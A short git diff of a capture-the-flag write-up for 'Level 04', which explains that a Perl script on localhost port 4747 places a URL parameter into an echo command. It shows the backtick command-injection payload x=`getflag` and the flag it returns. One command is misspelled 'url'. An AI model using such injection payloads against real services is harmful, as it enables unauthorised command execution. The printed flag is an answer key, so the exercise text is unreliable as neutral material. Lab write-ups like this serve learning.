@@ -1,11 +1,11 @@
 # Level 04
 
-Check for open ports:
+A perl script file can be found in the user directory. We can check the service is running with `netstat -tulpn`. 
 
-netstat -tulpn
+We see in the source code that  the script contains a subroutine that takes as parameter `x`. It puts it in a `echo` command. Because the file has the flag04 owner, we can exploit this.
 
-curl localhost:4747?x=lol prints lol
+```bash
+curl localhost:4747?x=lol # lol
+url localhost:4747?x=\`getflag\` # ne2searoevaevoem4ov4ar8ap
+```
 
-We need to execute command in the current one
-
-curl localhost:4747?x=\`getflag\`
